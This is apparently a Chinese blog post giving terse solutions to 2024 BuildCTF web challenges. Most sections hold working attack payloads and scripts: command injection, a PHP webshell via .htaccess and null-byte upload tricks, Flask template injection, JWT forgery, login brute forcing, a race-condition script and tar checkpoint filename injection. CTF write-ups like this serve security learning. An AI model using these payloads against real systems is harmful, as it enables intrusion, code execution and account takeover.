---
typora-root-url: ./2024buildCTF
title: 2024buildCTF-web-wp
toc: true
categories:
  - 技术
  - ctf
  - web
  - wp
date: 2024-10-10 22:15:08
tags: 
  - ctf
---

# 2024buildCTF -web-wp

## 我写的网站被rce了？

`log_type=||nl${IFS}/fl''ag||`

## ez!http

跟着按要求操作，用http头伪造

## find-the-id

传id爆破就行

## babyupload

可上传.htaccess       `AddType application/x-httpd-php .png`

上传2.png   GIF89a<?=`en''v`?>

访问2.png

## RedFlag

```python
{{url_for.__globals__['current_app'].config}}
```

https://www.freebuf.com/articles/web/305268.html

## tflock

```python
import time
import requests

route = "/login.php"
# url2 = "http://27.25.151.80:38515/admin.php"
url = 'http://27.25.151.80:8000/api/game/2/container/10'
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
cookie = {'GZCTF_Token':'xxxxxxx'}

def des():
    response = requests.delete(url, cookies=cookie)
    # print(response.text)
    # if response.status_code == 429:
    #     print("等待10秒")
    #     time.sleep(10)
    if response.status_code == 200:
        return
    else:
        des()
i = 0
#载入字典
with open("password.txt", "r") as f:
    dictionary = f.readlines()
while True:
    response = requests.post(url,cookies=cookie)

    # print(response.text)
    if response.status_code == 200:
        response = response.json()
        route='http://'+response["entry"]+"/login.php"
        # print(route)
        for j in range(2):
            i+=1
            # print(dictionary[i-1].strip())
            data = {"username": "admin", "password": dictionary[i-1].strip()}
            print("次数："+str(i))
            r = requests.post(route, data=data).json()
            print(r)
            if r["success"] == True:
                print(dictionary[i].strip())
                print(r)
                break
        des()
    elif response.status_code == 400:
        des()
        continue
    else:
        # print("等待1")
        # time.sleep(10)
        continue
```

admin密码ti1oLz@OhU

flag:${jnDl:rMi://ZPs27nNU9vjg7d6zgFh2EsHvYM435ATt.OA5ti1Y.COM}

这格式无敌了

## ez_md5

level1

`ffifdyop`

https://blog.csdn.net/qq_45521281/article/details/105848249

md5:

```mysql
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

level2

a=2653531602&b=2427435592

```php
<?php
$a = '114514';
$b = 'xxxxxxx';
for($i=1000000;$i<10000000;$i++) {
    $b=$i;
    $c = md5($a.$b);
    if ($c === '3e41f780146b6c246cd49dd296a3da28') {
        echo 'ok' . $b;
    }
}
```

Build[CTF.com=1145146803531

https://www.cnblogs.com/meng-han/p/16804708.html

## Why_so_serials?

```php
<?php
class Gotham{
    public $Bruce;
    public $Wayne;
    public $crime=true;
    public function __construct($Bruce,$Wayne){
        $this->Bruce = $Bruce;
        $this->Wayne = $Wayne;
    }
}
echo strlen('";s:5:"crime";b:1;}');
echo str_repeat('joker',19);

$city = new Gotham("Batman",'joker";s:5:"crime";b:1;}');
echo serialize($city);
```

jokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjoker";s:5:"crime";b:1;}

## sub

注册登录拿jwt, 改role为admin, 用秘钥BuildCTF加密得eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ4dCIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcyOTMyMjc1NH0.5OMCHZdCC4zXZeeBdlI7iZxzh_CUxx1f8U3FDqi4kRs

file=test2.txt;env

## eazyl0gin

```javascript
username: "buıldCTF"
password: "012346"
```

https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html

## Cookie_Factory

ctrl+shift+i打开开发者工具

socket.on('error'处下断点 f5刷新

```javascript
 socket.emit('click', JSON.stringify({ "power": 1000000000000000000000000000000000000000000000000000000000000000000000, "value": send.value }));socket.on('error', function (msg) {    console.log("Error")   });socket.on('recievedScore', function (msg) {    let scores = JSON.parse(msg)    send.value = scores.value    console.log(scores.value) });
```

运行

## 刮刮乐

http头加 referer:baidu.com

cmd=cat /f*>>4

curl访问路径4

## fake_signin

![img](2.png)

flask默认开启多线程（threaded默认True），而users是全局变量，多线程并进，每个都会访问修改users，在supplement_count+=1还未返回时，开多个线程可以同时签到

条件竞争，一次直接签30个

```Python
from concurrent.futures import *

url = "http://27.25.151.80:43427"

import requests
req = requests.session()
def login():
    req.post(f"{url}/login", data={'username':"admin", 'password': "admin"})

def attack(date):
    rsp = req.post(f"{url}/supplement_signin", data= {"supplement_date": date})
    if b'BuildCTF{' in rsp.content:
        c = rsp.content
        f1 = c.find(b'BuildCTF{')
        f2 = c.find(b'}', f1)
        print(c[f1:f2 + 1])
        exit(0)

if __name__ == '__main__':
    payloads = [f'2024-09-{str(i).zfill(2)}' for i in range(1, 31)]
    login()
    thr = ThreadPoolExecutor(30)
    thr.map(attack, payloads)
'''
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'

b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'b'BuildCTF{5d5a77cc-0406-40d9-9087-bb3953ec7f8c}'
'''
```

## 打包给你

![L6YtvZPBS52bxac](1.png)

*表示当前目录下所有非隐藏文件文件名组合    

上传文件名

1. --checkpoint=1
2. --checkpoint-action=exec=$(echo Y2F0IC9HdWVzc19teV9uYW1l|base64 -d)>1
3. 2.txt(任意文件)

下载两次，第一次相当于把文件名拼到*的地方，执行命令$(echo Y2F0IC9HdWVzc19teV9uYW1l|base64 -d)>1将flag内容写入文件1

第二次将1打包发送给我们

## ez_waf

\x0000000000000000截断

找一个文件尾有很多\x00000的文件

bp抓包文件尾添加<?php system(env);   上传成功